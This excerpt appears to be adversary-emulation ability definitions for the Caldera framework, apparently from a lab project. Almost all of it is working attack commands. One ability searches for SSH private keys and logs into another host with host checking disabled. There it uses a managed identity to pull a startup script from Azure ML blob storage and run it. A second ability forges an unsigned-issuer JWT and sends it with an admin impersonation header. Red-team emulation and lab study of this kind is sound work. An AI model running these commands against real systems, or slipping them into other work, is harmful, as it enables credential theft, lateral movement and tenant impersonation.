...
- id: 214736f2-a209-4850-9b9e-d6c3b31b42cf
  ...
  executors:
    - name: sh
      ...
      timeout: 60
      command: |
        KEY_PATH=$(for p in ~/.ssh/id_rsa /home/caldera/.ssh/id_rsa /root/.ssh/id_rsa; do if [ -f "$p" ]; then echo "$p"; break; fi; done); if [ -z "$KEY_PATH" ]; then echo "[-] ERROR"; exit 1; fi; ssh -i "$KEY_PATH" -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o BatchMode=yes tfgadmin@10.0.2.4 'az login --identity > /dev/null 2>&1 &&  az storage blob download --account-name __NOMBRE_AML_STORAGE__ --container-name azureml-blobstore --name startup/startup.sh --file /tmp/target_startup.sh --auth-mode login > /dev/null 2>&1 && chmod +x /tmp/target_startup.sh && echo "[*] EVIDENCIA FORENSE:" && /tmp/target_startup.sh' 2>&1
EOF
...
- id: f7e5bd7e-d7af-4668-85b8-50c50c1dc675
  ...
  executors:
    - name: sh
      platform: linux
      command: |
        pip3 install pyjwt -q && python3 -c "import time, jwt; now=int(time.time()); t = jwt.encode({'aud':'https://graph.windows.net','iss':'https://sts.windows.net/fake/','nbf':now-86400,'iat':now-86400,'exp':now+86400}, 'fake', algorithm='HS256'); open('/tmp/actor_token.txt', 'w').write(t.decode() if isinstance(t, bytes) else t)"; OUT=$(curl -sS -w "\n%{http_code}" -m 5 -H "Authorization: Bearer $(cat /tmp/actor_token.txt)" -H "x-ms-impersonation-upn: admin@__TENANT_DOMAIN__" "http://10.0.2.4:8080"); CURL_STATUS=$?; HTTP_STATUS=$(echo "$OUT" | tail -n1); BODY=$(echo "$OUT" | sed '$d'); echo "$BODY"; if [ $CURL_STATUS -ne 0 ] || [ "$HTTP_STATUS" != "200" ]; then exit 1; fi
EOF
